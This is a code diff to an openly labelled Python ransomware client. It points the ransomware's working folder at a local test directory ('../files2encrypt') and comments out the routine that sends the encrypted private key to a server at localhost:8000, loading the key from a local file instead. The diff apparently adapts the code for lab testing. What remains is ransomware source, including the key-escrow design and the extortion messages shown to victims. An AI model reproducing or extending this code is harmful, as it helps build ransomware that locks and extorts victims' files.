@@ -43,7 +43,10 @@ server_address = ("http://localhost:8000")
 home = environment.get_home_path()
 desktop = environment.get_desktop_path()
 username = environment.get_username()
-ransomware_path = os.path.join(home, ransomware_name)
+
+test_path = "../files2encrypt"
+#ransomware_path = os.path.join(home, ransomware_name)
+ransomware_path = os.path.join(test_path, ransomware_name)
 machine_id = environment.get_unique_machine_id()
 
 
@@ -95,35 +98,46 @@ def payment():
 
 
 def menu():
-    print("{}Importing the encrypted client private key".format(WHITE))
+    # print("{}Importing the encrypted client private key".format(WHITE))
+    # try:
+    #     with open(os.path.join(ransomware_path, 'encrypted_client_private_key.key'),
+    #               'rb') as f:
+    #         encrypted_client_private_key = pickle.load(f)
+    # except IOError:
+    #     print("encrypted client private key not found, \
+    #           I'm sorry. but all your files are lost!")
+    #     sys.exit(-1)
+
+    # print("{}OK{}".format(GREEN, WHITE))
+
+    # key_to_be_sent = base64.b64encode(str(encrypted_client_private_key))
+
+    # # send to server to be decrypted
+    # while True:
+    #     try:
+    #         print("Requesting to server to decrypt the private key")
+    #         client_private_key = send_to_server_encrypted_private_key(machine_id, key_to_be_sent)
+    #         break
+    #     except:
+    #         print("{}No connection, sleeping for 2 minutes\nConnect \
+    #               to internet to get your files back!{}".format(RED, WHITE))
+    #         time.sleep(120)
+
+    # # saving to disk the private key
+    # print("{}Client private key decrypted and stored to disk{}".format(GREEN, WHITE))
+    # with open(os.path.join(ransomware_path, "client_private_key.PEM"), 'wb') as f:
+    #     f.write(client_private_key)
+
+    #Replace server-related code with direct loading of client_private_key.PEM
+    print("{}Importing client private RSA key (local){}".format(WHITE, END))
     try:
-        with open(os.path.join(ransomware_path, 'encrypted_client_private_key.key'),
-                  'rb') as f:
-            encrypted_client_private_key = pickle.load(f)
+        with open(os.path.join(ransomware_path, "client_private_key.PEM"), 'rb') as f:
+            client_private_key = f.read()
     except IOError:
-        print("encrypted client private key not found, \
-              I'm sorry. but all your files are lost!")
+        print(f"{RED}Client private key not found locally, files can't be decrypted!{END}")
         sys.exit(-1)
 
-    print("{}OK{}".format(GREEN, WHITE))
-
-    key_to_be_sent = base64.b64encode(str(encrypted_client_private_key))
-
-    # send to server to be decrypted
-    while True:
-        try:
-            print("Requesting to server to decrypt the private key")
-            client_private_key = send_to_server_encrypted_private_key(machine_id, key_to_be_sent)
-            break
-        except:
-            print("{}No connection, sleeping for 2 minutes\nConnect \
-                  to internet to get your files back!{}".format(RED, WHITE))
-            time.sleep(120)
-
-    # saving to disk the private key
-    print("{}Client private key decrypted and stored to disk{}".format(GREEN, WHITE))
-    with open(os.path.join(ransomware_path, "client_private_key.PEM"), 'wb') as f:
-        f.write(client_private_key)
+    print(f"{GREEN}Successfully loaded RSA private key.{END}")
 
     # GET THE AES KEYS and path
     try:
